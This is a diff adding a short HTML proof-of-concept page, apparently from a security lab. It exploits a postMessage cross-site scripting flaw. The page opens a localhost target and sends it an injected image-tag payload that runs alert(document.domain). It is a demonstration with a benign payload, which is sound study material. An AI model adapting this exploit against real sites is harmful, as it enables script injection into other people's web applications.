@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Code</title>
+</head>
+
+    <h1>Attacker Code Example</h1>
+    
+
+    <script>
+        function exploitXSS() {
+            // Open the target window (replace 'target-window.html' with the actual path to the vulnerable target)
+            var targetWindow = window.open('https://127.0.0.1/postmessage/main.html');
+
+            // Ensure the target window is fully loaded before sending the message
+            targetWindow.onload = function() {
+                // Send a postMessage with malicious payload
+                targetWindow.postMessage(JSON.stringify({xss1:'<img src=x onerror=alert(document.domain)>'}), '*');
+            };
+        }
+    </script>
+<body>
+<button onclick="exploitXSS()">Exploit XSS</button>	
+</body>
+</html>
